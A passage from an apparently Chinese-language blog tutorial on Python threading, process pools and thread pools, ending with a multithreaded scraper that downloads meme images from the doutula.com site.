<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> n</span><br><span class="line">        print(n,self.name)</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    ThreadList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530163771.85.png" alt></p>
</li>
<li><p>设计线程锁的实例（尽管现在测试没有出现线程不安全的问题，还是将它作为补充）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> n, lock</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            print(n , self.name)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    ThreadList = []</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530163912.26.png" alt></p>
</li>
</ol>
<h3 id="通过进程池和线程池来实现并发设计"><a href="#通过进程池和线程池来实现并发设计" class="headerlink" title="通过进程池和线程池来实现并发设计"></a>通过进程池和线程池来实现并发设计</h3><blockquote>
<p>通过进程池和线程池实现并发设计，也算是对上一篇多进程学习的补充与应用</p>
</blockquote>
<h4 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h4><blockquote>
<p>进程池的使用有四种方式：apply_async、apply、map_async、map。其中apply_async和map_async是异步的，也就是启动进程函数之后会继续执行后续的代码不用等待进程函数返回。apply_async和map_async方式提供了一些获取进程函数状态的函数：ready()、successful()、get()。join()放在close()后面，是多进程中说到过的</p>
</blockquote>
<ul>
<li>通过一个实例来体现Python的进程池中的四种方法的特点，主要的区别是在异步</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">'msg:'</span>,msg)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func_return: %s'</span> % msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#apply_async</span></span><br><span class="line">    print(<span class="string">'\n------apply_async--------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg = <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply_async(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply_async:不阻塞'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        i.wait()     <span class="comment">#等待进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> i.ready():            <span class="comment">#判断进程函数是否已经启动了</span></span><br><span class="line">            <span class="keyword">if</span> i.successful():   <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">                print(i.get())   <span class="comment">#输出进程函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#apply</span></span><br><span class="line">    print(<span class="string">'\n----------apply---------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg =  <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply:阻塞'</span>)           <span class="comment">#执行完func才可以执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map</span></span><br><span class="line">    print(<span class="string">'\n---------map-----------'</span>)</span><br><span class="line">    args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">5</span>)</span><br><span class="line">    return_data = pool.map(func,args)</span><br><span class="line">    print(<span class="string">'map:阻塞'</span>) <span class="comment">#执行完func才执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(return_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map_async</span></span><br><span class="line">    print(<span class="string">'\n-------map_async---------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">5</span>)</span><br><span class="line">    result = pool.map_async(func,args)</span><br><span class="line">    print(<span class="string">'ready:'</span>,result.ready())</span><br><span class="line">    print(<span class="string">'不阻塞'</span>)</span><br><span class="line">    result.wait()  <span class="comment">#等待所有进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.ready():           <span class="comment">#判断进程函是否已经启动了</span></span><br><span class="line">        <span class="keyword">if</span> result.successful():  <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">            print(result.get())  <span class="comment">#输出进程函数的返回值</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530167366.44.png" alt></p>
<h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><blockquote>
<p>线程池使用multiprocessing提供的线程池，线程池的使用有四种方式：apply_async、apply、map_async、map，代码与进程池类似。下面直接贴代码，实现的过程与进程池基本一致</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">'msg:'</span>,msg)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func_return: %s'</span> % msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#apply_async</span></span><br><span class="line">    print(<span class="string">'\n------apply_async--------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg = <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply_async(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply_async:不阻塞'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        i.wait()     <span class="comment">#等待进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> i.ready():            <span class="comment">#判断进程函数是否已经启动了</span></span><br><span class="line">            <span class="keyword">if</span> i.successful():   <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">                print(i.get())   <span class="comment">#输出进程函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#apply</span></span><br><span class="line">    print(<span class="string">'\n----------apply---------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg =  <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply:阻塞'</span>)           <span class="comment">#执行完func才可以执行该语句</span></span><br><span class="line">    <span class="comment"># pool.close()</span></span><br><span class="line">    <span class="comment"># pool.join()</span></span><br><span class="line">    print(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map</span></span><br><span class="line">    print(<span class="string">'\n---------map-----------'</span>)</span><br><span class="line">    args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">5</span>)</span><br><span class="line">    return_data = pool.map(func,args)</span><br><span class="line">    print(<span class="string">'map:阻塞'</span>) <span class="comment">#执行完func才执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(return_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map_async</span></span><br><span class="line">    print(<span class="string">'\n-------map_async---------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">5</span>)</span><br><span class="line">    result = pool.map_async(func,args)</span><br><span class="line">    print(<span class="string">'ready:'</span>,result.ready())</span><br><span class="line">    print(<span class="string">'不阻塞'</span>)</span><br><span class="line">    result.wait()  <span class="comment">#等待所有进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.ready():           <span class="comment">#判断进程函是否已经启动了</span></span><br><span class="line">        <span class="keyword">if</span> result.successful():  <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">            print(result.get())  <span class="comment">#输出进程函数的返回值</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530167991.95.png" alt></p>
<h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><blockquote>
<p>通过对比可以发现线程池和进程池的代码差别并不是很大，和前面通过队列实现并发一样，所以在选取以何种方式做并发时还是要结合实际的情况</p>
</blockquote>
<h3 id="实例应用"><a href="#实例应用" class="headerlink" title="实例应用"></a>实例应用</h3><blockquote>
<p>学习了这么多，还是要进行实际运用，接下来利用线程池做一个高并发的爬虫，同时也可以巩固一下爬虫。这个练习是通过线程池结合队列爬取表情包(emmm)，以斗图啦网站为例(<a href="https://www.doutula.com" target="_blank" rel="noopener">https://www.doutula.com</a>)</p>
</blockquote>
<ul>
<li><p>分析页面，在最新表情中表情包最多，一共有1655页，每一页的连接为：<a href="https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png)" target="_blank" rel="noopener">https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png)</a></p>
</li>
<li><p>当然，我们查看的时候看到的是浏览器渲染以后的页面，所以元素可能会是动态生成的；如果要查看未渲染之前的图片，直接查看源码，也是一样的。</p>
</li>
<li><p>分析一下图片的连接：该网站使用新浪的图床<code>ws1.sinaimg.cn</code>,多查看几个图片地址发现不一定是<code>ws1</code>子域名 ，可能是是任何<code>ws</code>开头，后面跟数字 ，出现这种情况的原因是：根据HTTP/1.1协议规定，浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞 ，所以利用不同的子域来绕过限制。这一点其实不影响我们（假如你的正则是直接匹配图片完整连接）</p>
</li>
<li><p>经过测试，网站没有做反爬，接下来就简单了，步骤如下：</p>
<ul>
<li>获取单个页面用正则匹配img标签的图片地址和图片描述</li>
<li>将获取到的表情包下载保存</li>
<li>改变page参数爬取所有的列表页面</li>
</ul>
</li>
<li><p>当然，重要的是用上线程池，为了提高爬取速度，再加上进程的通信</p>
</li>
<li><p>代码实现：</p>
<ul>
<li><p>设置图片保存的文件夹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建两个线程池，分别用于图片任务和页面任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>用正则去匹配图片信息，并将获取到的图片链接和描述入队</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">'data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;'</span>,re.S)</span><br><span class="line">    img_list = re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> url, name <span class="keyword">in</span> img_list:</span><br><span class="line">        <span class="comment">#将图片的后缀加到name中，方便后面的保存</span></span><br><span class="line">        name = name + url[<span class="number">-4</span>:]</span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取页面的源码（尽管没有限制，但还是加上UA头和cookie）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持,确保连接的是同一个页面，将同一个页面的爬取完以后再连接下一个页面</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        get_imglist(response.text)</span><br></pre></td></tr></table></figure>
</li>
<li><p>保存表情包：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br></pre></td></tr></table></figure>
</li>
<li><p>主函数（启动线程池，队列等）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ef main():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line">    <span class="comment"># get_page()</span></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())</span><br></pre></td></tr></table></figure>
</li>
<li><p>完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置图片保存的文件夹,如果运行的py文件存在，os.path.dirname(__file__)输出完整的目录，如果是相对路径，输出为空</span></span><br><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br><span class="line"><span class="comment"># print(BASE_DIR)</span></span><br><span class="line"><span class="comment">#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</span></span><br><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建两个线程池，分别用于图片任务和页面任务</span></span><br><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">error = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#用正则去匹配图片信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">'data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;'</span>,re.S)</span><br><span class="line">    img_list = re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> url, name <span class="keyword">in</span> img_list:</span><br><span class="line">        name = name + url[<span class="number">-4</span>:]</span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        get_imglist(response.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line">    <span class="comment"># get_page()</span></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行结果：</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530183677.11.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530183691.54.png" alt></p>
</li>
</ul>
</li>
<li><p>以上是通过正则表达式来做的，下面稍加修改，用解析库来做：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br><span class="line"><span class="comment"># print(BASE_DIR)</span></span><br><span class="line"><span class="comment">#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</span></span><br><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建两个线程池，分别用于图片任务和页面任务</span></span><br><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">error = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">    img_list = soup.find_all(<span class="string">'a'</span>,class_=<span class="string">'col-xs-6 col-sm-3'</span>)</span><br><span class="line">    <span class="comment"># print(img_list)</span></span><br><span class="line">    <span class="keyword">for</span> imgs <span class="keyword">in</span> img_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = imgs.find(<span class="string">'img'</span>)[<span class="string">'data-original'</span>]</span><br><span class="line">            name = imgs.find(<span class="string">'p'</span>,style=<span class="string">'display: none'</span>).text + url[<span class="number">-4</span>:]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        get_imglist(response.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
